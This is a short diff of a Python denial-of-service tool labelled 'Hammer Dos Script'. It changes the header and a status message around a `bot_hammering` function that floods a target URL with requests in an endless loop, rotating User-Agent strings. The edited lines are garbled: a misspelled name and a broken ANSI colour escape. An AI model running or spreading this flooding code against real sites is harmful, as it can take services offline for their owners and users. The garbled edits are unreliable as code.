@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# python 3.3.2+ Hammer Dos Script v.1
+# python 3.3.2+ will hammet v.1
 # by Can Yalçın
 # only for legal purpose
 
@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94Is willhammering...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
